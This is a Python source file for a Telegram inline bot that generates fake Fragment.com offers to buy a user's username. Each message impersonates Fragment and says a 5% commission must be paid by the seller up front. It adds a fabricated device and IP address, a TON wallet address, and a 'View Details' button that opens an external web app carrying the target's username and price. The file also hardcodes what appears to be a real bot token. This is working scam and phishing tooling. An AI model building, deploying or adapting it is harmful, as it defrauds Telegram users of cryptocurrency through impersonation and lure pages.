import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes
from telegram import InlineQueryResultArticle, InputTextMessageContent

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    try:
        print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
        
        # Prix TON actuel - récupération en temps réel
        ton_price = get_ton_price()
        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
        
        # Calculs
        price = float(ton_amount)
        price_usd = price * ton_price
        commission = price * 0.05
        commission_usd = commission * ton_price
        
        print(f"🔧 DEBUG: Calculs - Prix: {price} TON (${price_usd:.2f}), Commission: {commission} TON (${commission_usd:.2f})")
        
        # Adresse wallet pour le lien cliquable
        wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
        
        # Message Fragment EXACT (copié de votre version)
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

        print(f"🔧 DEBUG: Message généré (longueur: {len(fragment_message)})")
        
        # Création des entités pour le formatage (identique à votre version)
        entities = [
            MessageEntity(type=MessageEntity.BOLD, offset=57, length=len(username)+1),
            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("• Offer Amount:"), length=15),
            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("• Commission:"), length=13),
            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("Additional Information:"), length=23),
            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("Important:"), length=10),
        ]
        
        # Ajout de l'entité pour le lien wallet
        wallet_start = fragment_message.find(wallet_address)
        if wallet_start != -1:
            wallet_url = f"https://tonviewer.com/{wallet_address}"
            entities.append(MessageEntity(
                type=MessageEntity.TEXT_LINK,
                offset=wallet_start,
                length=len(wallet_address),
                url=wallet_url
            ))
        
        print(f"🔧 DEBUG: {len(entities)} entités créées")
        
        # SEULE MODIFICATION : URL du bouton avec paramètres
        webapp_url_with_params = f"{WEBAPP_URL}?user={username}&price={price:g}"
        
        # Création du bouton "View Details" avec paramètres
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("View Details", web_app=WebAppInfo(url=webapp_url_with_params))
        ]])
        
        print(f"🔧 DEBUG: Bouton créé avec URL: {webapp_url_with_params}")
        print(f"✅ DEBUG: Message généré avec succès pour {username}")
        
        return fragment_message, entities, keyboard
        
    except Exception as e:
        print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
        import traceback
        traceback.print_exc()
        raise e

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire pour les requêtes inline"""
    print(f"🔍 DEBUG: inline_query_handler appelé")
    
    try:
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        print(f"🔍 DEBUG: Requête reçue: '{query}'")
        
        # Réponse vide si pas de requête
        if not query:
            print("🔍 DEBUG: Requête vide - pas de résultats")
            await update.inline_query.answer([], cache_time=0)
            return
            
        # Parsing de la requête
        parts = query.split()
        if len(parts) < 2:
            print(f"🔍 DEBUG: Pas assez de paramètres ({len(parts)}) - pas de résultats")
            await update.inline_query.answer([], cache_time=0)
            return
        
        username = parts[0].replace('@', '')
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant négatif ou zéro")
        except ValueError as ve:
            print(f"🔍 DEBUG: Montant invalide '{parts[1]}': {ve}")
            await update.inline_query.answer([], cache_time=0)
            return
        
        print(f"✅ DEBUG: Paramètres validés: username='{username}', ton_amount={ton_amount}")
        
        # Génération du message Fragment
        try:
            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
            print(f"🔧 DEBUG: Message Fragment généré avec succès")
        except Exception as gen_error:
            print(f"❌ DEBUG: Erreur génération message: {gen_error}")
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Calcul du prix actuel pour l'affichage
        current_ton_price = get_ton_price()
        current_usd_value = ton_amount * current_ton_price
        
        print(f"💰 DEBUG: Prix d'affichage: {ton_amount} TON = ${current_usd_value:.2f} USD")
        
        # Création du résultat inline
        try:
            results = [
                InlineQueryResultArticle(
                    id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                    title=f"Fragment Deal: @{username}",
                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                    input_message_content=InputTextMessageContent(
                        fragment_message,
                        entities=entities,
                        disable_web_page_preview=True
                    ),
                    reply_markup=keyboard
                )
            ]
            
            print(f"🔧 DEBUG: Résultat inline créé (ID: deal_{username}_{ton_amount}_{int(time.time())})")
            
            # Envoi de la réponse
            await update.inline_query.answer(results, cache_time=0)
            print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
            
        except Exception as result_error:
            print(f"❌ DEBUG: Erreur création résultat inline: {result_error}")
            import traceback
            traceback.print_exc()
            await update.inline_query.answer([], cache_time=0)
        
    except Exception as e:
        print(f"❌ Erreur critique dans inline_query_handler: {e}")
        import traceback
        traceback.print_exc()
        await update.inline_query.answer([], cache_time=0)

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire pour les webhooks Telegram"""
    
    def do_POST(self):
        """Gestion des requêtes POST du webhook"""
        global app, event_loop
        
        try:
            # Vérification du chemin
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                self.end_headers()
                return
            
            # Lecture des données
            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Traitement asynchrone dans l'event loop principal
            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )
            
            # Réponse OK
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status pour vérifier que le bot fonctionne"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

async def process_update(update_data):
    """Traitement des updates Telegram"""
    global app
    
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            if update:
                await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    """Démarre le serveur webhook"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configuration du bot"""
    global app, event_loop
    
    try:
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Initialisation
        await app.initialize()
        await app.start()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        
        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
        
        # Garde l'event loop actif
        event_loop = asyncio.get_event_loop()
        
        # Démarrage du serveur webhook dans un thread séparé
        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Attente infinie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
